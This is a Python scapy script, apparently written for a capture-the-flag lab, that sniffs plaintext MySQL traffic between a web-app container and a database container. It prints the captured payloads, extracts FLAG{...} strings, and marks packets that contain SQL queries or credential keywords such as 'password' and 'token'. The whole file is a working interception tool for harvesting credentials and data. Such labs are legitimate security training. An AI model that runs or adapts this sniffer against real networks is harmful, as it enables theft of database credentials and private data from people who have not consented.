#!/usr/bin/env python3
"""
MITM Traffic Capture Script
Captures and analyzes MySQL traffic between webapp and database
"""

import sys
import re
from scapy.all import sniff, TCP, IP, Raw
from datetime import datetime

# Known container IPs
WEBAPP_IP = "172.20.0.10"
DATABASE_IP = "172.20.0.11"
MYSQL_PORT = 3306

# Flag pattern
FLAG_PATTERN = re.compile(r'FLAG\{[^}]+\}')

def extract_mysql_data(packet):
    """Extract readable data from MySQL packet"""
    if packet.haslayer(Raw):
        try:
            payload = packet[Raw].load
            # MySQL protocol: first byte is packet number, skip it
            if len(payload) > 1:
                data = payload[1:].decode('utf-8', errors='ignore')
                return data
        except:
            try:
                # Try without skipping first byte
                data = payload.decode('utf-8', errors='ignore')
                return data
            except:
                pass
    return None

def analyze_packet(packet):
    """Analyze a captured packet for MySQL traffic"""
    if not packet.haslayer(TCP) or not packet.haslayer(IP):
        return
    
    src_ip = packet[IP].src
    dst_ip = packet[IP].dst
    src_port = packet[TCP].sport
    dst_port = packet[TCP].dport
    
    # Check if this is MySQL traffic
    is_mysql_traffic = (
        (src_ip == WEBAPP_IP and dst_ip == DATABASE_IP and dst_port == MYSQL_PORT) or
        (src_ip == DATABASE_IP and dst_ip == WEBAPP_IP and src_port == MYSQL_PORT)
    )
    
    if not is_mysql_traffic:
        return
    
    # Extract data
    data = extract_mysql_data(packet)
    if not data:
        return
    
    # Print packet info
    direction = "→ DB" if dst_ip == DATABASE_IP else "← DB"
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    
    print(f"\n[{timestamp}] {direction} {src_ip}:{src_port} → {dst_ip}:{dst_port}")
    print(f"Data: {data[:200]}")  # First 200 chars
    
    # Check for flags
    flags = FLAG_PATTERN.findall(data)
    if flags:
        print(f"\n{'='*60}")
        print(f"🚩 FLAG FOUND: {flags[0]}")
        print(f"{'='*60}\n")
    
    # Check for SQL queries
    if any(keyword in data.upper() for keyword in ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'SHOW']):
        print(f"📝 SQL Query detected")
    
    # Check for credentials
    if any(keyword in data.lower() for keyword in ['password', 'user', 'root', 'token']):
        print(f"🔑 Potential credential data")

def packet_handler(packet):
    """Handle each captured packet"""
    try:
        analyze_packet(packet)
    except Exception as e:
        print(f"Error processing packet: {e}", file=sys.stderr)

def main():
    print("="*60)
    print("MITM Traffic Capture - MySQL Traffic Analysis")
    print("="*60)
    print(f"\nMonitoring MySQL traffic:")
    print(f"  Webapp:  {WEBAPP_IP}")
    print(f"  Database: {DATABASE_IP}")
    print(f"  Port:    {MYSQL_PORT}")
    print("\nGenerating traffic by accessing http://localhost:5001")
    print("Press Ctrl+C to stop capturing\n")
    print("="*60)
    
    try:
        # Capture MySQL traffic
        sniff(
            filter=f"tcp port {MYSQL_PORT} and (host {WEBAPP_IP} or host {DATABASE_IP})",
            prn=packet_handler,
            count=0  # Capture indefinitely
        )
    except KeyboardInterrupt:
        print("\n\nCapture stopped by user")
    except PermissionError:
        print("\n❌ Permission denied. Run with sudo:")
        print("   sudo python3 capture_traffic.py")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        print("\nNote: This script needs to run on the host machine")
        print("      with access to the Docker bridge network.")
        print("\nAlternative: Use tcpdump (see capture_with_tcpdump.sh)")
        sys.exit(1)

if __name__ == "__main__":
    main()

